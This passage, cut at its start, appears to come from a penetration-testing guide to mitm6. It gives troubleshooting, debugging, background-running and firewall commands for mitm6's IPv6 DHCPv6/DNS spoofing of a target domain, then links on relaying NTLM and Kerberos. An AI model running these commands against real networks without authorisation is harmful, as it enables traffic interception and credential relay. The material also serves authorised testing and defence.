sudo setcap cap_net_raw,cap_net_admin+eip $(which mitm6)
```

**Issue: Python dependency errors**

```bash
# Reinstall dependencies
pip3 install --force-reinstall scapy twisted netifaces

# Check Python version
python3 --version

# Install for specific Python version
pip3.11 install mitm6
```

**Issue: Conflicting DHCPv6 servers**

```bash
# Check for existing DHCPv6 servers on the network
sudo tcpdump -i eth0 -n 'udp port 546 or udp port 547' -c 20

# If another server responds, filter to specific hosts
mitm6 -hw "WORKSTATION-042" -d target.local
```

**Issue: Firewall blocking traffic**

```bash
# Ensure firewall allows required ports
sudo ip6tables -A INPUT -p udp --dport 547 -j ACCEPT
sudo ip6tables -A INPUT -p udp --dport 53 -j ACCEPT
sudo ip6tables -A INPUT -p icmpv6 -j ACCEPT

# For UFW
sudo ufw allow 547/udp
sudo ufw allow 53/udp
```

### Debug Mode

```bash
mitm6 --debug -d target.local 2>&1 | tee debug.log
```

### Performance Tuning

```bash
# Run on specific CPU core
taskset -c 0 mitm6 -d target.local

# Limit logging output
mitm6 -d target.local 2>&1 | grep -E "\[\*\]|\[+\]" | tee filtered.log

# Run in background with nohup
nohup mitm6 -d target.local -v > mitm6_bg.log 2>&1 &
echo $! > mitm6.pid
```

### Network Impact Mitigation

```bash
# Check if mitm6 is causing network issues
# Monitor DNS response rates
tcpdump -i eth0 -n 'udp port 53 and src host fe80::' -c 100 | wc -l

# Monitor DHCPv6 response rate
tcpdump -i eth0 -n 'udp port 546' -c 100 | wc -l

# Stop mitm6 cleanly
kill $(cat mitm6.pid)
# IPv6 addresses will expire within 5 minutes
# DNS cache will clear within ~100 seconds
```

---

## Resources

- **GitHub:** https://github.com/dirkjanm/mitm6
- **Blog Post:** https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
- **Kerberos Relay Blog:** https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/
- **Detection Signatures:** https://gist.github.com/fox-srt/98f29051fe56a1695de8e914c4a2373f
- **Kali Documentation:** https://www.kali.org/tools/mitm6/
- **ntlmrelayx (Impacket):** https://github.com/CoreSecurity/impacket
- **krbrelayx:** https://github.com/dirkjanm/krbrelayx
- **IPv6 Security:** https://www.ietf.org/rfc/rfc7112.txt
- **DHCPv6 RFC:** https://www.ietf.org/rfc/rfc8415.txt
- **DNS Dynamic Updates:** https://www.ietf.org/rfc/rfc3007.txt
